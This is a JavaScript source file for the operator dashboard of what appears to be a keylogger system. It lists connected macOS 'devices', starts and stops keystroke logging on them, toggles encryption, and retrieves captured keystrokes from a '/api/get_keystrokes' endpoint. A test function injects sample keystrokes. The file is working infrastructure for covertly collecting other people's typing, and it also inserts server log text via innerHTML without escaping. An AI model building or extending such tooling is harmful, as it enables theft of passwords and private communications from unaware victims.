// Device management
let devices = [];
let isEncrypted = {};  // Store encryption state for each device

// Get CSRF token from meta tag
const csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');

async function refreshDevices() {
    try {
        const response = await fetch('/api/devices', {
            headers: {
                'X-CSRFToken': csrfToken
            }
        });
        
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        
        const devices = await response.json();
        updateDevicesList(devices);
    } catch (error) {
        console.error('Error fetching devices:', error);
        // Optionally show an error message to the user
        const devicesList = document.getElementById('devices-list');
        devicesList.innerHTML = '<div class="alert alert-danger">Error loading devices. Please try again later.</div>';
    }
}

function updateDevicesList(devices) {
    const devicesList = document.getElementById('devices-list');
    const template = document.getElementById('device-template');
    
    devicesList.innerHTML = '';
    
    if (devices.length === 0) {
        devicesList.innerHTML = '<div class="alert alert-info">No devices connected. Click "New Connection" to add a device.</div>';
        return;
    }
    
    devices.forEach(device => {
        const clone = template.content.cloneNode(true);
        const deviceItem = clone.querySelector('.device-item');
        
        // Set device ID as data attribute
        deviceItem.dataset.deviceId = device.id;
        
        // Update device information
        clone.querySelector('.device-id').textContent = device.id;
        clone.querySelector('.device-name-text').textContent = device.name || 'Unnamed Device';
        
        // Update status badge
        const statusBadge = clone.querySelector('.device-status');
        if (device.is_active) {
            statusBadge.classList.add('bg-success');
            statusBadge.textContent = 'Connected';
        } else {
            statusBadge.classList.add('bg-secondary');
            statusBadge.textContent = 'Disconnected';
        }
        
        devicesList.appendChild(clone);
    });
}

function formatDate(dateString) {
    if (!dateString) return 'Never';
    const date = new Date(dateString);
    return date.toLocaleString();
}

async function toggleLogs(btn) {
    const logsContainer = btn.closest('.device-item').querySelector('.logs-container');
    const logsContent = logsContainer.querySelector('.logs-content');
    const deviceId = btn.closest('.device-item').dataset.deviceId;

    if (logsContainer.style.display === 'none') {
        try {
            const response = await fetch(`/api/logs/${deviceId}`);
            if (response.ok) {
                const logs = await response.json();
                if (logs.length > 0) {
                    // The logs are already formatted from the server as:
                    // "[timestamp] Device-id: content"
                    logsContent.innerHTML = logs.join('<br>');
                } else {
                    logsContent.textContent = 'No logs available';
                }
                logsContainer.style.display = 'block';
                btn.innerHTML = '<i class="bi bi-eye-slash"></i> Hide Logs';
            }
        } catch (error) {
            console.error('Error fetching logs:', error);
            logsContent.textContent = 'Error loading logs';
        }
    } else {
        logsContainer.style.display = 'none';
        btn.innerHTML = '<i class="bi bi-eye"></i> View Logs';
    }
}

async function startLogging(btn) {
    const deviceId = btn.closest('.device-item').dataset.deviceId;
    try {
        const response = await fetch('/api/toggle_logging', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRFToken': csrfToken
            },
            body: JSON.stringify({
                device_id: deviceId,
                action: 'start'
            })
        });
        
        const data = await response.json();
        
        if (response.ok) {
            btn.disabled = true;
            btn.nextElementSibling.disabled = false; // Enable stop button
            const statusBadge = btn.closest('.device-item').querySelector('.device-status');
            statusBadge.textContent = 'Logging';
            statusBadge.className = 'device-status badge bg-warning';
            showAlert('Logging started successfully', 'success');
        } else {
            showAlert(data.error || 'Failed to start logging', 'danger');
        }
    } catch (error) {
        console.error('Error:', error);
        showAlert('Failed to start logging: Network error', 'danger');
    }
}

async function stopLogging(btn) {
    const deviceId = btn.closest('.device-item').dataset.deviceId;
    try {
        const response = await fetch('/api/toggle_logging', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRFToken': csrfToken
            },
            body: JSON.stringify({
                device_id: deviceId,
                action: 'stop'
            })
        });
        
        if (response.ok) {
            btn.disabled = true;
            btn.previousElementSibling.disabled = false; // Enable start button
            const statusBadge = btn.closest('.device-item').querySelector('.device-status');
            statusBadge.textContent = 'Connected';
            statusBadge.className = 'device-status badge bg-success';
        } else {
            const error = await response.json();
            alert('Failed to stop logging: ' + error.message);
        }
    } catch (error) {
        console.error('Error:', error);
        alert('Failed to stop logging');
    }
}

let encryptionState = {};

async function toggleEncryption(btn) {
    const deviceId = btn.closest('.device-item').dataset.deviceId;
    try {
        const response = await fetch('/api/toggle_encryption', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRFToken': csrfToken
            },
            body: JSON.stringify({
                device_id: deviceId
            })
        });
        
        if (response.ok) {
            const data = await response.json();
            const icon = btn.querySelector('i');
            if (data.is_encrypted) {
                icon.className = 'bi bi-lock-fill';
                btn.title = 'Encryption enabled';
            } else {
                icon.className = 'bi bi-unlock';
                btn.title = 'Encryption disabled';
            }
        } else {
            const error = await response.json();
            alert('Failed to toggle encryption: ' + error.message);
        }
    } catch (error) {
        console.error('Error:', error);
        alert('Failed to toggle encryption');
    }
}

async function viewLogs(btn) {
    const deviceItem = btn.closest('.device-item');
    const deviceId = deviceItem.dataset.deviceId;
    const logsContainer = deviceItem.querySelector('.logs-container');
    const logsContent = logsContainer.querySelector('.logs-content');
    
    try {
        const response = await fetch(`/api/get_keystrokes?machine=${deviceId}&encrypted=${encryptionState[deviceId] || false}`);
        if (response.ok) {
            const data = await response.json();
            logsContent.textContent = data.data;
            logsContainer.style.display = logsContainer.style.display === 'none' ? 'block' : 'none';
        } else {
            const error = await response.json();
            showAlert(error.error || 'Error fetching logs', 'danger');
        }
    } catch (error) {
        console.error('Error fetching logs:', error);
        showAlert('Error fetching logs', 'danger');
    }
}

async function removeDevice(btn) {
    const deviceItem = btn.closest('.device-item');
    const deviceId = deviceItem.dataset.deviceId;
    
    if (!confirm('Are you sure you want to remove this device?')) return;
    
    try {
        // First check if logging is active and stop it
        const statusBadge = deviceItem.querySelector('.device-status');
        if (statusBadge.textContent === 'Logging') {
            const stopResponse = await fetch('/api/toggle_logging', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRFToken': csrfToken
                },
                body: JSON.stringify({
                    device_id: deviceId,
                    action: 'stop'
                })
            });
            
            if (!stopResponse.ok) {
                console.warn('Failed to stop logging, continuing with device removal');
            }
        }
        
        // Then remove the device
        const response = await fetch('/api/remove_device', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRFToken': csrfToken
            },
            body: JSON.stringify({
                device_id: deviceId
            })
        });
        
        if (response.ok) {
            // Remove from UI only after successful server response
            deviceItem.remove();
            showAlert('Device removed successfully', 'success');
        } else {
            const error = await response.json();
            throw new Error(error.error || 'Failed to remove device');
        }
    } catch (error) {
        console.error('Error:', error);
        showAlert(error.message || 'Failed to remove device', 'danger');
    }
}

async function createNewConnection() {
    try {
        const response = await fetch('/api/register_device', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRFToken': csrfToken
            },
            body: JSON.stringify({
                type: 'macos'
            })
        });
        
        if (response.ok) {
            const data = await response.json();
            refreshDevices();
        } else {
            console.error('Failed to register device');
        }
    } catch (error) {
        console.error('Error:', error);
    }
}

function showAlert(message, type) {
    const alertDiv = document.createElement('div');
    alertDiv.className = `alert alert-${type} alert-dismissible fade show position-fixed top-0 start-50 translate-middle-x mt-3`;
    alertDiv.style.zIndex = '1050';
    alertDiv.innerHTML = `
        ${message}
        <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
    `;
    document.body.appendChild(alertDiv);
    
    setTimeout(() => {
        alertDiv.remove();
    }, 5000);
}

// Initial load
document.addEventListener('DOMContentLoaded', () => {
    refreshDevices();
});

// Add periodic status updates
setInterval(refreshDevices, 30000); // Update every 30 seconds 

// Add this function to simulate keystrokes (for testing)
async function simulateKeystrokes(deviceId) {
    try {
        const response = await fetch('/api/log_keystrokes', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRFToken': csrfToken
            },
            body: JSON.stringify({
                device_id: deviceId,
                keystrokes: 'Hello, this is a test keystroke!'
            })
        });
        
        if (!response.ok) {
            const error = await response.json();
            console.error('Error logging keystrokes:', error);
        }
    } catch (error) {
        console.error('Error:', error);
    }
} 